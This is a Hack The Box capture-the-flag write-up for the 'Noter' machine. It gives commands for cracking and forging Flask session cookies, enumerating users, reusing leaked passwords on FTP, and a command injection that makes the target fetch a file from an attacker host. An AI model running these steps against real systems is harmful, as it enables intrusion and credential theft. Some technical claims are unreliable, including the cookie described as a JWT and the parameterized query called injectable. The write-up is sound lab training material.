> Author: **[kavigihan][author-profile]**

## Discovery

### Port scanning

```shell
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)
|   256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)
|_  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title: Noter
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### Directories

```shell
/login                (Status: 200) [Size: 1963]
/register             (Status: 200) [Size: 2642]
/logout               (Status: 302) [Size: 218] [--> http://10.10.11.160:5000/login]
/dashboard            (Status: 302) [Size: 218] [--> http://10.10.11.160:5000/login]
/notes                (Status: 302) [Size: 218] [--> http://10.10.11.160:5000/login]
/VIP                  (Status: 302) [Size: 218] [--> http://10.10.11.160:5000/login]
````

### Web browsing

After registering, the web app lands on a dashboard:

<img src="images/dashboard.png" style="display:block; max-width: 50vw; margin-left: auto; margin-right: auto;">

XSS doesn't seem to work, but there's and intriguing session cookie:

```
eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIm5vdGUgVXBkYXRlZCJdfV0sImxvZ2dlZF9pbiI6dHJ1ZSwidXNlcm5hbWUiOiJhcGVoZXgifQ.YoZYNA.R84EdAvQlWtep73ABT3rrX_cIoI
```

It is a JWT token with header:

```json
{
  "_flashes": [
    {
      " t": [
        "success",
        "note Updated"
      ]
    }
  ],
  "logged_in": true,
  "username": "apehex",
  "alg": "HS256"
}
```

## Impersonating the staff

### Cracking the JWT

Since the server is Werkzeug and the port 5000, the application is most likely
made with Flask.

Also the signature is valid with the `HS256` algorithm.

Hacktricks points toward [Flask-Unsign][hacktricks]:

```shell
flask-unsign --unsign --no-literal-eval \
    --wordlist /usr/share/wordlists/passwords/rockyou-75.txt \
    --cookie 'eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIm5vdGUgVXBkYXRlZCJdfV0sImxvZ2dlZF9pbiI6dHJ1ZSwidXNlcm5hbWUiOiJhcGVoZXgifQ.YoZYNA.R84EdAvQlWtep73ABT3rrX_cIoI'
```

The JWT was signed with `secret123`!

### Finding a target user

To impersonate a user with the JWT, we need a valid username.

The login page responds with "Invalid credentials" when a user doesn't exist
and "Invalid login" when the username exist and the password is wrong:

```shell
curl -i -s -k -X $'POST' \
    -H $'Content-Type: application/x-www-form-urlencoded' \
    --data-binary $'username=test&password=pass' \
    $'http://10.10.11.160:5000/login' | grep -ai invalid
```

This distinction enables user enumeration:

```shell
ffuf -X $'POST' -u $'http://10.10.11.160:5000/login' \
    -H $'Content-Type: application/x-www-form-urlencoded' \
    -d $'username=FUZZ&password=pass' \
    -w $'/usr/share/wordlists/usernames/cirt-default-usernames.txt' \
    -fr $'valid credentials' \
    -o $'discovery/10.10.11.160/usernames'
```

Only "blue" comes out.

### Crafting a new JWT

We can now create valid tokens with arbitrary content with:

```shell
flask-unsign --sign --cookie '{"logged_in":true,"username":"blue"}' --secret 'secret123'
```

Actually the CLI is escaping some characters, making the format invalid. So
I used the module directly in Python:

```python
from flask_unsign import session

KEY = 'secret123'
COOKIE = {"logged_in":True,"username":"blue"}

__jwt = session.sign(
    value=COOKIE,
    secret=KEY,
    legacy=False)
```

The private notes of user "blue" have sensitive information:

<img src="images/leak.png" style="display:block; max-width: 32vw; margin-left: auto; margin-right: auto;">

## Pivoting

So far, we've gathered the following credentials:

```
blue blue@Noter!
ftp_admin
```

Let's try these on the FRP server:

```shell
ls -lah
# drwxr-xr-x    2 1002     1002         4096 May 02 23:05 files
# -rw-r--r--    1 1002     1002        12569 Dec 24 20:59 policy.pdf
```

`policy.pdf` explains the password policy, in particular default passwords:

```
4. Default user-password generated by the application is in the format of "username@site_name!" (This applies to all your applications)
```

For "ftp_admin" it would be `ftp_admin@Noter!`... it works on the FTP server:

```shell
ls -lah
# -rw-r--r--    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip
# -rw-r--r--    1 1003     1003        26298 Dec 01 05:52 app_backup_1638395546.zip
```

## Analysing the app

The backups are separated by a month:

```shell
date -d @1635803546
# Mon Nov  1 10:52:26 PM CET 2021
date -d @1638395546
# Wed Dec  1 10:52:26 PM CET 2021
```

### Processing the changelog

To view the differences easily, let's create a new Git repository and
commit the files:

```shell
REPO=$(mktemp -d) && git init "${REPO}"
unzip -d "${REPO}/1635803546" app_backup_1635803546.zip
unzip -d "${REPO}/1638395546" app_backup_1638395546.zip
mv "${REPO}/.git/" "${REPO}/1635803546/" && cd "${REPO}/1635803546/" && git add . && git commit -m 'Older'
mv "${REPO}/1635803546/.git/" "${REPO}/1638395546/" && cd "${REPO}/1638395546/" && git add . && git commit -m 'Newer'
```

Seeing the differences is now ezclap:

```shell
git diff HEAD~ HEAD
# --- a/app.py
# +++ b/app.py
# @@ -14,11 +14,13 @@ app = Flask(__name__)
 
#  # Config MySQL
#  app.config['MYSQL_HOST'] = 'localhost'
# -app.config['MYSQL_USER'] = 'root'
# -app.config['MYSQL_PASSWORD'] = 'Nildogg36'
# +app.config['MYSQL_USER'] = 'DB_user'
# +app.config['MYSQL_PASSWORD'] = 'DB_password'
#  app.config['MYSQL_DB'] = 'app'
#  app.config['MYSQL_CURSORCLASS'] = 'DictCursor'
 
# +attachment_dir = 'misc/attachments/'
# +
#  # init MYSQL
#  mysql = MySQL(app)
```

The known credentials are now:

```
blue blue@Noter!
ftp_admin ftp_admin@Noter!
root Nildogg36
```

Also the latest patch has a serious vulnerability in `@app.route('/export_note_remote', methods=['POST'])`:

```python
+                    command = f"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}"
+                    subprocess.run(command, shell=True, executable="/bin/bash")
```

### Command injection

This allows a straightforward command injection in `r.text`, which is filled when
the server requests a given "url":

```python
r = pyrequest.get(url,allow_redirects=True)
```

And this is triggered by a POST to `/export_note_remote` with the relevant
parameters:

```shell
curl -i -s -k -X $'POST' \
    -H $'Content-Type: application/x-www-form-urlencoded' \
    -b $'session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YoaIQw.fntEnZnQsDZfY6yjJ5XWKkz0V60' \
    --data-binary $'url=http://10.10.16.2:8888/note.md' \
    $'http://10.10.11.160:5000/export_note_remote/'
``` 

Fails with:

```
The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.
```

### SQLi

There's potential for SQLi too:

```python
result = cur.execute("SELECT * FROM notes where author= %s",[session['username']])
```

[author-profile]: https://app.hackthebox.com/users/389926
[dashboard]: images/dashboard.png
[hacktricks]: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask#flask-unsign
[leak]: images/leak.png
